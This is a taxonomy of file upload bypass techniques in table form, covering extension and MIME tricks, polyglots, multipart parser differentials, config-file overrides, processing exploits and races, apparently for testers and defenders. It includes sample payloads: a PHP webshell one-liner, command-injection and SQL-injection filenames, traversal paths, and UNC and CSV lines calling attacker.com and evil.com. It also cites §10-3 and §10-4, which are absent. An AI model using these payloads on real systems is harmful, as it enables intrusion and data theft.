# File Upload Vulnerability — Mutation / Variation Taxonomy

> A comprehensive, structurally organized reference of all known mutation types, bypass techniques, and exploitation vectors targeting file upload functionality in web applications. Every technique is classified by **what structural component is mutated** and **what security mismatch it creates**, rather than by source or discovery timeline.

---

## Classification Structure

File upload vulnerabilities arise whenever an application accepts user-supplied files without adequately validating **identity** (what the file *is*), **intent** (what the file *does*), and **destination** (where the file *goes*). The attack surface spans from the transport protocol (multipart/form-data parsing) through validation logic (extension, MIME, magic bytes) to post-upload behavior (storage, processing, delivery).

### Axis 1 — Mutation Target (Primary Structure)

The structural component being manipulated:

| § | Category | Target |
|---|----------|--------|
| §1 | File Extension & Name Validation | The filename string and its parsed extension |
| §2 | Content-Type / MIME Header | The `Content-Type` header declared in the upload request |
| §3 | File Content & Magic Bytes | The binary signature and internal structure of the file body |
| §4 | Multipart Protocol Layer | The `multipart/form-data` framing, headers, and boundaries |
| §5 | Filename Path & Metadata Injection | The filename as a carrier for path traversal, command injection, or XSS |
| §6 | Server Configuration Override | Uploaded files that alter server-side execution rules |
| §7 | Server-Side Processing Pipeline | Post-upload processing (image conversion, document parsing, archive extraction) |
| §8 | Storage & Delivery Layer | Storage location, serving mechanism, and content-disposition behavior |
| §9 | Temporal & Race Condition | Timing gaps between upload, validation, and access |

### Axis 2 — Discrepancy / Bypass Type (Cross-Cutting)

Every mutation works because it creates a mismatch between two components:

| Type | Description |
|------|-------------|
| **Validation Bypass** | The file passes a check it should have failed (extension allowlist, MIME filter, magic byte check) |
| **Parser Differential** | Two systems (WAF vs. backend, proxy vs. app) interpret the same upload differently |
| **Processing Exploitation** | Server-side processing of a "safe" file triggers unintended behavior (SSRF, XXE, RCE) |
| **Configuration Override** | An uploaded file changes how the server handles subsequent requests |
| **Temporal Gap** | The file is accessible/executable in the window between upload and validation/deletion |
| **Delivery Mismatch** | The file is safe at rest but dangerous when served (MIME sniffing, inline rendering) |

---

## §1. File Extension & Name Validation

File extension validation is the most common — and most commonly bypassed — defense. Mutations in this category target the logic that determines whether a filename's extension is "safe."

### §1-1. Blocklist (Deny List) Evasion

When the server maintains a list of forbidden extensions (e.g., `.php`, `.jsp`, `.asp`), attackers exploit omissions and parsing quirks.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Alternative executable extensions** | Languages support multiple extensions that map to the same interpreter. Blocklists rarely cover all of them. | PHP: `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phar`, `.phps`, `.pgif`, `.inc` · JSP: `.jspx`, `.jsw`, `.jsv`, `.jspf` · ASP: `.aspx`, `.ashx`, `.asmx`, `.asa`, `.cer`, `.xamlx` · ColdFusion: `.cfm`, `.cfml`, `.cfc`, `.dbm` · Perl: `.pl`, `.pm`, `.cgi`, `.lib` |
| **Case variation** | Validation is case-sensitive but the server/OS is not. | `exploit.pHp`, `exploit.PHP`, `exploit.Php` |
| **Double extension** | The server interprets the last extension; the validator checks the first (or vice versa). Apache with `mod_mime` may process any recognized extension. | `exploit.php.jpg`, `exploit.jpg.php`, `exploit.php.png` |
| **Trailing characters** | OS or server strips trailing dots, spaces, or slashes after extension parsing. | `exploit.php.` (Windows strips trailing dot), `exploit.php ` (trailing space), `exploit.php/` |
| **Null byte / delimiter injection** | A null byte or newline truncates the filename at the OS or language level, while the validator sees the full string. | `exploit.php%00.jpg`, `exploit.php\x00.png`, `exploit.php%0a.jpg`, `exploit.php%0d.jpg`, `exploit.php%09.jpg` |
| **Windows Alternate Data Streams** | NTFS ADS syntax causes the OS to write to the base file while the validator sees a compound name. | `exploit.php::$DATA`, `exploit.php:shell.txt` |
| **Right-to-Left Override (RTLO)** | Unicode control character `U+202E` reverses the visual display of the filename, making `exploit‮gpj.php` appear as `exploitphp.jpg`. | Filename: `exploit\u202Egpj.php` |
| **Semicolon truncation** | Some servers (notably IIS) treat the semicolon as a filename terminator. | `exploit.asp;.jpg` |
| **Empty / dot-only extension** | Edge cases where the filename ends with a dot or has no extension at all. | `exploit.`, `exploit` |

### §1-2. Allowlist (Whitelist) Bypass

When the server permits only specific extensions (e.g., `.jpg`, `.png`, `.pdf`), attacks exploit parsing ambiguity.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Double extension with recognized suffix** | The validator extracts the final extension (`.jpg`) while the server executes based on an earlier extension. Apache's `mod_mime` recognizes *any* known extension in the chain. | `exploit.php.jpg` where Apache processes `.php` |
| **Null byte before allowed extension** | The allowed extension satisfies the validator; the null byte causes the backend to use only the preceding extension. | `exploit.php%00.png` |
| **Regex anchor bypass** | Loose regex like `\.jpg$` is bypassed by newline injection or by appending the allowed extension at non-terminal positions. | `exploit.php\n.jpg`, `exploit.php%0a.jpg` |
| **MIME/extension mismatch exploitation** | The validator checks the extension against an allowlist but the server maps extension→handler differently. | Upload `.phtml` when allowlist checks against a limited extension→MIME table that doesn't recognize `.phtml` |

### §1-3. Extension Parsing Differential

Different components in the stack parse extensions differently, creating exploitable mismatches.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Proxy vs. origin** | The reverse proxy determines extension using one algorithm; the origin server uses another. | Nginx sees `.jpg`; Apache processes the `.php` segment |
| **WAF vs. application** | The WAF extracts the "last" extension; the application uses the "first known" extension. | WAF allows `exploit.php.xyz`; the app executes `.php` |
| **OS-level vs. app-level** | Windows ignores trailing dots/spaces; Linux does not. Case sensitivity differs. | `exploit.PHP.` on Windows resolves to `exploit.PHP` → executed as PHP |

---

## §2. Content-Type / MIME Header Manipulation

The `Content-Type` header in the multipart part declares the MIME type of the uploaded file. Servers that trust this client-controlled value are trivially bypassed.

### §2-1. Direct Content-Type Substitution

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Safe MIME for dangerous file** | Replace the Content-Type with an allowed MIME type while keeping the malicious file extension and content. | Upload `shell.php` with `Content-Type: image/jpeg` |
| **Content-Type removal** | Omit the Content-Type header entirely; many parsers default to `application/octet-stream` or infer from extension. | Remove `Content-Type` line from the multipart part |
| **Duplicate Content-Type** | Send two Content-Type headers with different values; the validator reads one, the backend reads the other. | `Content-Type: image/png` followed by `Content-Type: application/x-php` |

### §2-2. MIME Sniffing Exploitation

Even when the file is uploaded with a "safe" Content-Type, the browser may re-interpret it at serving time.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Browser MIME sniffing** | If the server serves the file without `X-Content-Type-Options: nosniff`, the browser analyzes content and may render HTML/JS. | Upload an HTML file as `image/png`; browser sniffs `<html>` and renders it |
| **Apache Content-Type omission** | If the filename is `..png` (double-dot prefix), Apache returns no Content-Type, causing the browser to sniff and render. | Filename: `..png` with HTML content → browser renders as HTML |
| **IE/legacy MIME sniffing** | Older browsers aggressively sniff; a file with `GIF89a<script>...` may be rendered as HTML. | Polyglot GIF/HTML file served as `image/gif` |

---

## §3. File Content & Magic Bytes

Server-side validation may inspect the file's binary content — magic bytes (file signatures), image dimensions, or structural integrity — to confirm the declared type.

### §3-1. Magic Byte Prepending

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **GIF header injection** | Prefix malicious code with `GIF89a` (6 bytes). Most magic-byte checkers accept this as a valid GIF. | `GIF89a<?php system($_GET['cmd']); ?>` |
| **PNG header injection** | Prefix with PNG signature bytes `\x89PNG\r\n\x1a\n`. | `\x89PNG\r\n\x1a\n<?php ...?>` |
| **JPEG header injection** | Prefix with JPEG SOI marker `\xFF\xD8\xFF\xE0`. | `\xFF\xD8\xFF\xE0<?php ...?>` |
| **PDF header injection** | Prefix with `%PDF-1.4` to pass PDF signature checks. | `%PDF-1.4\n<?php ...?>` |

### §3-2. Polyglot File Construction

A polyglot is a file that is simultaneously valid under two or more format specifications, passing deep content validation while remaining executable.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **JPEG/PHP polyglot** | Embed PHP code in EXIF metadata fields (Comment, ImageDescription, UserComment) using ExifTool. The file passes JPEG structural validation and `getimagesize()` checks. | `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o polyglot.php` |
| **PNG/PHP polyglot** | Insert PHP code in PNG tEXt or zTXt chunks. The file passes PNG CRC validation. | PHP code in PNG metadata chunk, saved as `.php` |
| **GIF/JS polyglot** | A valid GIF whose pixel data decodes as valid JavaScript. Used for XSS via MIME sniffing. | `GIF89a=0;/*...*/alert(1)//` |
| **PDF/JS polyglot** | Embed JavaScript in PDF objects. When served inline, the PDF reader may execute JS. | PDF with embedded `app.alert()` in OpenAction |
| **BMP/PHP polyglot** | BMP's simple header format allows payload insertion after the bitmap header. | BMP header + PHP code in pixel data |
| **ICO/PHP polyglot** | ICO files have permissive parsers; PHP code can be embedded in image data segments. | Valid ICO header + PHP payload in image data |

### §3-3. Content Transformation Survival

When the server processes/transforms the uploaded file (e.g., resizing an image), the payload must survive the transformation.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **EXIF preservation** | Some image processing libraries preserve EXIF data during resize/crop. Payload in EXIF survives. | PHP code in EXIF Comment field survives `imagecopyresampled()` |
| **PNG chunk preservation** | Ancillary chunks (tEXt, iTXt) may survive re-encoding if the library doesn't strip them. | Payload in tEXt chunk survives `imagepng()` |
| **Pixel-level encoding** | Encode payload in pixel color values. Survives format conversion if dimensions are preserved. | Each byte of payload encoded as pixel color channel value |
| **ICC profile injection** | ICC color profiles in images are often preserved during processing. Payload embedded in ICC data. | PHP code in ICC profile block of JPEG |

---

## §4. Multipart Protocol Layer

The `multipart/form-data` encoding (RFC 7578) is the transport mechanism for file uploads. All known parsers deviate from the RFC in different ways, creating exploitable differentials between WAFs/validators and backend parsers.

### §4-1. Parameter Duplication

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Duplicate `name` parameter** | Two `name=` values in one Content-Disposition header. The validator reads the first; the backend reads the last (or vice versa). | `Content-Disposition: form-data; name="safe"; name="file"` |
| **Duplicate `filename` parameter** | Two `filename=` values. The WAF checks one; the backend uses the other. Affects PHP, Node.js/Busboy, FortiWeb, Barracuda. | `filename="safe.txt"; filename="shell.php"` |
| **Duplicate Content-Disposition header** | Two full Content-Disposition headers in a single part. Parser picks first vs. last. | First header: `filename="safe.jpg"` · Second header: `filename="shell.php"` |

### §4-2. Header / Boundary Manipulation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **CRLF sequence breaking** | Remove or alter `\r\n` in the header-body separator. Strict parsers (WAFs) reject; permissive parsers (PHP) continue. | Omit `\r` from `\r\n\r\n` between headers and body |
| **Quote removal** | Omit double quotes around parameter values. Some parsers (OpenResty, FortiWeb, Barracuda) fail to extract unquoted values. | `filename=shell.php` instead of `filename="shell.php"` |
| **Missing closing boundary** | Omit the final `--boundary--` terminator. PHP accepts truncated messages; WAFs may reject. | Remove trailing boundary marker |
| **Boundary injection / confusion** | Use characters in the boundary that confuse parsers (e.g., whitespace, quotes, special chars). | Boundary containing spaces or encoded characters |

### §4-3. Encoding & Format Confusion

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`filename*=UTF-8''` encoding** | RFC 6266 extended filename parameter with percent-encoding. WAFs don't URL-decode; backends do. OWASP CRS Rule 933110 is bypassed. | `filename*=UTF-8''shell%2ephp` (where `%2e` = `.`) |
| **URL-encoded body in multipart** | Convert the body from `application/x-www-form-urlencoded` to multipart format while keeping URL-encoded content. WAFs without multipart parsers (HAProxy, AWS WAF/Lambda) miss it. | Multipart wrapper around URL-encoded payload |
| **Charset confusion** | Specify unusual charsets in Content-Type that alter how the filename is decoded. | `Content-Type: text/plain; charset=utf-16` |

---

## §5. Filename Path & Metadata Injection

The filename field is not just an extension carrier — it's a string that may be used in file system operations, database queries, shell commands, or HTML rendering.

### §5-1. Path Traversal via Filename

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Relative path traversal** | The filename contains `../` sequences to escape the upload directory and write to arbitrary locations. | `filename="../../etc/cron.d/shell"` |
| **Absolute path injection** | The filename is an absolute path, overwriting the intended directory. | `filename="/var/www/html/shell.php"` |
| **URL-encoded traversal** | Path traversal characters are URL-encoded to bypass naive string filtering. | `filename="..%2F..%2F..%2Fshell.php"` |
| **Double-encoded traversal** | Double URL-encoding bypasses filters that decode once. | `filename="..%252F..%252Fshell.php"` |
| **UNC path injection** | Windows UNC paths trigger SMB connections to attacker-controlled servers (hash theft, SSRF). | `filename="\\\\attacker.com\\share\\file"` |
| **Backslash normalization** | On Windows, `\` is equivalent to `/` for path traversal but may bypass Linux-oriented filters. | `filename="..\\..\\shell.php"` |

### §5-2. Command Injection via Filename

When the application passes the filename to shell commands (e.g., virus scanning, file conversion), injection is possible.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Shell metacharacter injection** | Backticks, `$()`, semicolons, or pipes in the filename execute commands. | `filename="a$(whoami)z.png"`, `filename="a\`id\`z.jpg"` |
| **Semicolon command chaining** | A semicolon terminates the intended command and starts a new one. | `filename="test.jpg;sleep 10"` |
| **Pipe injection** | The pipe character redirects output to another command. | `filename="test.jpg|id"` |

### §5-3. Secondary Injection via Filename

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **SQL injection via filename** | The filename is inserted into a SQL query without parameterization. | `filename="'; DROP TABLE uploads;--.jpg"` |
| **XSS via filename** | The filename is rendered in an HTML page without encoding. | `filename="<script>alert(1)</script>.jpg"` |
| **LDAP / Header injection** | The filename is used in LDAP queries or HTTP headers without sanitization. | `filename="test\r\nX-Injected: true"` |
| **Log injection / log forging** | The filename appears in log files; injected content manipulates log analysis. | `filename="test.jpg\n[CRITICAL] Admin login succeeded"` |

---

## §6. Server Configuration Override

Instead of uploading executable code directly, attackers upload configuration files that alter how the server processes subsequent requests.

### §6-1. Apache Configuration Override

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`.htaccess` handler mapping** | Upload `.htaccess` with `AddType application/x-httpd-php .jpg` or `AddHandler php-script .txt`. All subsequent uploads with that extension are executed as PHP. | `AllowOverride` must include `FileInfo` or `All` |
| **`.htaccess` auto_prepend** | Set `php_value auto_prepend_file /path/to/shell` in `.htaccess` to include a malicious file before every PHP execution. | Requires `AllowOverride Options` |
| **`.htaccess` log redirection** | Redirect Apache error logs to a writable location, then inject PHP into error messages. Accessing the log file triggers execution. | Apache user must have write access to target |

### §6-2. PHP Configuration Override

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`.user.ini` auto_prepend/append** | Upload `.user.ini` with `auto_prepend_file=shell.gif` or `auto_append_file=shell.gif`. Every PHP file in the directory will include the specified file. | PHP-FPM or CGI/FastCGI SAPI; file must be in the upload directory or a parent directory |
| **`.user.ini` open_basedir manipulation** | Override `open_basedir` to expand the accessible file system scope. | Only works if `open_basedir` is not locked in `php.ini` with `PHP_INI_SYSTEM` |

### §6-3. IIS / ASP.NET Configuration Override

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`web.config` handler mapping** | Upload `web.config` that maps a safe extension to the ASP.NET handler. | IIS 7+ with handler override permissions |
| **`web.config` code execution** | The `web.config` file itself can contain inline C# or VB.NET code that executes when the directory is accessed. | `<system.webServer>` handler configuration |
| **`web.config` ISAPI filter** | Configure custom ISAPI filters via `web.config` to intercept and manipulate requests. | Requires appropriate trust level |

### §6-4. Other Configuration Overrides

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Nginx `.conf` include** | If the upload directory is within an `include` directive's glob pattern, a crafted config fragment is loaded. | Misconfigured `include /path/uploads/*.conf;` |
| **`.pht` / `.phtml` handler existence** | These extensions may already be mapped to the PHP handler in the default server configuration. No config override needed. | Default Apache/PHP installation |

---

## §7. Server-Side Processing Pipeline

Many applications don't just store uploaded files — they process them (resize images, extract archives, parse documents, generate thumbnails). Each processing step introduces attack surface.

### §7-1. Image Processing Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ImageMagick delegate injection (ImageTragick)** | Certain file formats (SVG, MVG, MIFF) trigger ImageMagick's "delegate" system, which executes external commands. A crafted image file achieves RCE. | ImageMagick without a restrictive `policy.xml` |
| **ImageMagick integer overflow** | 32-bit integer overflow in BMP encoder's scanline-stride computation leads to heap corruption. Triggered through upload-and-convert workflows. (CVE-2025-57803, CVSS 9.8) | 32-bit ImageMagick builds |
| **GhostScript command execution** | PostScript/EPS files processed by GhostScript (often invoked by ImageMagick for PDF/PS handling) can execute arbitrary commands. | GhostScript invoked for PDF/EPS/PS conversion |
| **LibAv/FFmpeg SSRF** | M3U8 playlist files or crafted video files trigger FFmpeg's network-capable protocols (HTTP, FTP, SMB), enabling SSRF. | FFmpeg used for video thumbnail generation |
| **Pillow/PIL decompression bomb** | Extremely large images (e.g., 1×1 pixel with gigabytes of decompressed data) cause memory exhaustion. | No `Image.MAX_IMAGE_PIXELS` limit configured |
| **ExifTool RCE** | Versions 7.44–12.23 of ExifTool are vulnerable to RCE via crafted DjVu filenames. A filename containing Perl code is evaluated during metadata extraction. | ExifTool version < 12.24 |

### §7-2. Document Processing Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **SVG → XXE** | SVG files use XML; a crafted SVG with external entity declarations triggers XXE when parsed server-side. | Server-side SVG parsing (librsvg, Batik, Inkscape, browser rendering engines) |
| **SVG → SSRF** | SVG `<image>`, `<use>`, or `<foreignObject>` elements reference internal URLs, triggering server-side requests. | Server-side SVG rendering/conversion |
| **XML/XLSX/DOCX → XXE** | Office Open XML formats (`.xlsx`, `.docx`, `.pptx`) are ZIP archives containing XML. Malicious entity declarations in internal XML files trigger XXE. | Server-side parsing of Office documents (Apache POI, python-docx, etc.) |
| **PDF → SSRF / JS execution** | Crafted PDFs with `OpenAction`, `AA` (Additional Actions), or embedded JavaScript trigger actions when server-side PDF processors open them. HTML-to-PDF converters (wkhtmltopdf, PD4ML, Puppeteer) that render user-controlled HTML can be directed to fetch internal resources. | Server-side PDF generation or processing |
| **CSV injection** | Formulas in CSV files (e.g., `=SYSTEM("cmd")`, `=HYPERLINK("http://evil.com")`) execute when opened in spreadsheet software. | Server generates CSV from user input; user downloads and opens it |

### §7-3. Archive Extraction Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Zip Slip (path traversal in archive)** | Archive entries contain `../../` in filenames. During extraction, files are written outside the intended directory. | Extraction without canonicalization of entry paths |
| **Symlink escape** | Archive contains symbolic links pointing to `/etc/passwd` or other sensitive files. After extraction, accessing the symlink reads the target. | Extraction preserves symlinks; extracted directory is served |
| **Zip bomb / decompression bomb** | A small ZIP file (e.g., 42 KB) decompresses to petabytes, exhausting disk or memory. | No extraction size or ratio limits |
| **Tar permission manipulation** | Crafted tar archives set restrictive permissions on parent directories but readable permissions on subdirectories containing hidden symlinks. | Extraction preserves Unix permissions |
| **Archive-in-archive (nested bomb)** | Multiple layers of nested archives bypass single-level decompression limits. | Recursive extraction without depth limits |

### §7-4. Deserialization via File Upload

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Python pickle in uploaded file** | Applications that unpickle uploaded `.pkl`, `.pickle`, or `.dat` files allow RCE via crafted `__reduce__` methods. | Python application using `pickle.load()` on uploads |
| **YAML deserialization** | Uploaded YAML files processed with `yaml.load()` (unsafe loader) trigger arbitrary Python object construction. | Python with PyYAML; no `SafeLoader` |
| **Java object deserialization** | Uploaded serialized Java objects (`.ser`, or within custom formats) trigger gadget chains via `ObjectInputStream`. | Java application deserializing uploaded data |
| **PHP object injection** | Uploaded files containing serialized PHP objects (`O:...`) trigger magic methods (`__wakeup`, `__destruct`) with attacker-controlled properties. | PHP application using `unserialize()` on upload content |

---

## §8. Storage & Delivery Layer

Even if the file itself is inert, how it is stored and served determines whether it becomes an attack vector.

### §8-1. Execution Context Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Upload to web root** | Files uploaded directly into the document root are accessible and executable via HTTP. | Upload directory is within the web-accessible path |
| **Upload to aliased directory** | The upload directory is not the web root but is mapped via an alias, virtual host, or symbolic link. | Nginx `alias`, Apache `Alias`, or symlink in document root |
| **Extension-to-handler mapping** | The web server maps the uploaded file's extension to a server-side interpreter. | Default handler configurations for `.php`, `.jsp`, `.asp`, etc. |
| **SSI (Server-Side Includes) execution** | Files with `.shtml` or `.stm` extensions — or any extension configured for SSI — can execute `<!--#exec cmd="..."-->` directives. | SSI enabled in server configuration |

### §8-2. Content Delivery Mismatch

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Inline serving without `nosniff`** | Server serves uploaded files with `Content-Disposition: inline` and without `X-Content-Type-Options: nosniff`. Browser sniffs content and may render HTML/JS. | Missing security headers |
| **Same-origin serving** | Files served from the same origin as the application. Uploaded HTML/SVG can access cookies, execute JS in the app's context (stored XSS). | Upload storage on the same domain/origin as the app |
| **SVG inline rendering** | SVG files served with `Content-Type: image/svg+xml` are rendered by the browser, executing embedded `<script>` or event handlers. | SVG served inline from the application's origin |
| **HTML file serving** | Uploaded HTML files served without content-disposition: attachment become full pages in the app's context. | No forced download for HTML uploads |
| **Content-Type mismatch** | Server sets a wrong or generic Content-Type (e.g., `text/plain` for SVG), which the browser overrides via sniffing. | Server does not set correct Content-Type per file type |

### §8-3. Cloud / Object Storage Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Presigned URL scope expansion** | AWS S3 presigned URLs can be manipulated to access files beyond the intended path or list bucket contents. | Presigned URL generated with overly broad permissions |
| **Bucket/blob public access** | Uploaded files stored in publicly accessible cloud storage, enabling direct access and potential data leakage. | Misconfigured bucket/blob ACLs |
| **CDN cache poisoning via upload** | Uploaded files cached at the CDN layer with incorrect Content-Type or headers, serving malicious content to other users. | CDN caches responses for the upload path |
| **Subdomain takeover via storage** | The upload storage (S3, Azure Blob) is referenced by a CNAME record. If the storage is deleted but the DNS record persists, an attacker can claim it. | Dangling DNS CNAME to deleted storage resource |

---

## §9. Temporal & Race Condition

When validation and storage are not atomic, a window exists between file upload and validation/deletion where the file is accessible.

### §9-1. Upload-then-Validate Race

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **File accessible before scan** | The server writes the file to disk, then performs validation (virus scan, extension check). The file is web-accessible during this window. | Non-atomic upload+validate; file path is predictable |
| **Execute before delete** | The server uploads, validates, finds it malicious, and deletes. But between upload and deletion, the attacker sends a request to execute the file. | Small but exploitable time window; requires rapid concurrent requests |
| **PHPInfo() temp file race** | PHP stores uploads in a temporary file before the script processes them. The `phpinfo()` page leaks the temp file path. A race condition accesses the file before it's cleaned up. | `phpinfo()` accessible; PHP temp directory is web-accessible or includable |

### §9-2. URL-Based Upload Race

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Remote fetch race** | The application fetches a file from a user-supplied URL, saves it locally, then validates. The attacker's server delays the response or redirects mid-transfer. | Application supports "upload from URL" functionality |
| **DNS rebinding on upload** | The application resolves the URL hostname, validates the IP, then fetches. Between resolution and fetch, DNS rebinding changes the IP to an internal address. | URL-based upload with DNS-based SSRF protection |

### §9-3. Concurrency Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Parallel upload race** | Two uploads with the same target filename arrive simultaneously. One contains a malicious file; the other is benign. The validation result for the benign file may be applied to the malicious file's storage. | Shared filename namespace; non-atomic validate+store |
| **Symlink swap race** | After upload but before validation, the attacker replaces the uploaded file with a symlink to a sensitive file. The "validation" then reads the symlink target. | Attacker has filesystem access (shared hosting, local privilege escalation) |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Conditions | Primary Mutation Categories |
|----------|--------------------------|----------------------------|
| **Remote Code Execution (Webshell)** | Server-side interpreter in web root; extension→handler mapping active | §1 + §2 + §3 + §6 |
| **Stored XSS** | Files served inline from same origin; no `nosniff` header | §3-2 + §5-3 + §8-2 |
| **Server-Side Request Forgery (SSRF)** | Server-side document/image processing; network-capable libraries | §7-1 + §7-2 |
| **XML External Entity Injection (XXE)** | Server-side XML parsing of uploaded SVG/XLSX/DOCX/XML | §7-2 |
| **Path Traversal / File Overwrite** | Filename used in filesystem operations without canonicalization | §5-1 + §7-3 |
| **Denial of Service** | No upload size/dimension limits; archive extraction without bounds | §7-1 + §7-3 |
| **Data Exfiltration** | Symlink in archives; XXE with file:// protocol; SSRF to cloud metadata | §7-2 + §7-3 |
| **WAF / Filter Bypass** | Multi-tier architecture (WAF → proxy → app); multipart parsing differentials | §4 |
| **Configuration Hijacking** | Apache with AllowOverride; IIS handler override; PHP-FPM SAPI | §6 |
| **Supply Chain / Subdomain Takeover** | Cloud storage with dangling DNS; CDN serving uploaded content | §8-3 |
| **Privilege Escalation via Deserialization** | Application deserializes uploaded files (pickle, YAML, Java serialized) | §7-4 |
| **ML Model RCE** | Application loads user-uploaded ML models (pickle, .h5, .pt, ONNX) | §10-3 |
| **Python Framework DoS** | Multipart parser abuse, unlimited file counts, decompression bombs | §10-1 + §10-2 |
| **Python Processing Pipeline RCE** | Server-side document/image processing via Pillow, ReportLab, PyMuPDF, CairoSVG | §10-4 |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §1 + §5-1 (Extension + Path Traversal) | CVE-2024-53677 (Apache Struts 2) | CVSS 9.5. File upload parameter manipulation enables path traversal to restricted directories. Actively exploited in the wild. |
| §5-1 + §8-1 (Path Traversal + Execution) | CVE-2024-50623 (Cleo Harmony/VLTrader/LexiCom) | Unauthenticated RCE via unrestricted file upload/download with autorun feature exploitation. Mass exploitation by ransomware groups. |
| §1 + §8-1 (Extension + Upload to web root) | CVE-2024-57968 (Advantive VeraCore) | CVSS 9.9. Authenticated users upload files to unintended directories. |
| §8-1 (Upload causing system disruption) | CVE-2024-5911 (Palo Alto Panorama) | Arbitrary file upload by authenticated admin causes system crash and maintenance mode. |
| §1 + §6 (Extension bypass + Config override) | CVE-2024-31210 (WordPress) | Plugin upload vulnerability enabling RCE through crafted plugin packages. |
| §1 + §6 (Extension bypass patch bypass ×2) | CVE-2024-31280 (WordPress church-admin) | Arbitrary File Upload in ZIP handling; patched twice, bypassed twice. |
| §7-1 (ImageMagick integer overflow) | CVE-2025-57803 (ImageMagick) | CVSS 9.8. 32-bit integer overflow in BMP encoder via upload-and-convert workflow. |
| §7-1 (ExifTool RCE) | CVE-2021-22204 (ExifTool) | RCE via crafted DjVu file; still relevant in unpatched systems. $20,000 GitLab bounty. |
| §7-2 (SVG → SSRF) | HackerOne #223203 (Shopify) | SVG upload triggers SSRF via server-side SVG rendering. |
| §7-3 (Zip Slip) | CVE-2018-1002200 (Multiple libraries) | Path traversal via archive extraction. Affected Java, .NET, Ruby, JS libraries. Still discovered in new libraries annually. |
| §4-3 (Multipart parser differential) | WAFFLED (ACSAC 2025 research) | 1,207 WAF bypasses discovered through multipart parsing discrepancies across PHP, Node.js, Python and major WAFs. |
| §7-2 (XXE via XLSX) | Multiple WordPress plugin CVEs (2024) | XXE through uploaded Excel files processed by PHPSpreadsheet. |
| §7-1 (CodeIgniter + ImageMagick) | CVE-2025-54418 (CodeIgniter4) | ImageMagick handler vulnerability in framework's image processing library. |

---

## §10. Python Ecosystem — Framework & Library Specific

Python web frameworks and libraries introduce a distinct file upload attack surface due to framework-level parsing behaviors, permissive deserialization defaults, and processing library vulnerabilities. This section consolidates Python-specific vectors that cross-cut the general categories above.

### §10-1. Framework Upload Handling Vulnerabilities

| Framework | Subtype | Mechanism | Key Condition |
|-----------|---------|-----------|---------------|
| **Django** | Unlimited file count DoS | Before Django 4.2, no limit on the number of files per multipart request. Thousands of file parts in a single request exhaust memory and file descriptors. (CVE-2023-24580, CVSS 7.5) | Django < 4.1.7; `DATA_UPLOAD_MAX_NUMBER_FILES` not available |
| **Django** | `FileExtensionValidator` bypass | Only checks the final extension string against an allowlist; does not validate file content. A PHP webshell renamed to `.jpg` passes validation. | Reliance on `FileExtensionValidator` as sole defense |
| **Django** | `upload_to` path injection | If `upload_to` callable incorporates user input without sanitization, path traversal is possible. `FileSystemStorage` calls `os.path.join()` which resolves `../` sequences. | Custom `upload_to` using unsanitized user input |
| **Django** | `MemoryUploadedFile` vs `TemporaryUploadedFile` | Files below `FILE_UPLOAD_MAX_MEMORY_SIZE` (default 2.5 MB) are held entirely in memory. Multiple concurrent uploads near the threshold can exhaust worker memory. | High-concurrency upload endpoints |
| **Flask/Werkzeug** | `secure_filename` limitations | `secure_filename()` strips non-ASCII characters entirely, doesn't handle Windows reserved names (`CON`, `NUL`, `COM1`), and returns empty string for filenames consisting only of special characters. | Using `secure_filename()` as the sole sanitization layer |
| **Flask/Werkzeug** | No default size limit | Flask has no built-in request body size limit. Must explicitly set `MAX_CONTENT_LENGTH`. Without it, a single upload can consume all available memory/disk. | `MAX_CONTENT_LENGTH` not configured |
| **FastAPI/Starlette** | Multipart parser DoS | Crafted `Content-Disposition` headers cause excessive CPU usage in Starlette's multipart parser. (CVE-2024-47874, CVSS 8.0) | Starlette < 0.40.0 |
| **FastAPI/Starlette** | `StaticFiles` directory traversal | When serving uploaded files via `StaticFiles`, path traversal through crafted request URIs can access files outside the intended directory. (CVE-2024-47824) | Serving uploads via `StaticFiles` mount |
| **FastAPI/Starlette** | No body size limit by default | Uvicorn's `--limit-max-body-size` defaults to unlimited. No framework-level upload size restriction exists. | Uvicorn without explicit body size configuration |

### §10-2. Python Archive & Compression Processing

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`zipfile` path traversal (pre-3.12)** | Python's `zipfile.extractall()` does not validate entry paths before Python 3.12. Archive entries containing `../../` write files outside the destination directory. | Python < 3.12 without manual path canonicalization |
| **`zipfile` data_filter (3.12+)** | Python 3.12 introduced `ZipFile.extractall(filter='data')` which rejects absolute paths, `..` components, and symlinks. Before this, no built-in protection existed. | Python < 3.12; or 3.12+ without `filter='data'` |
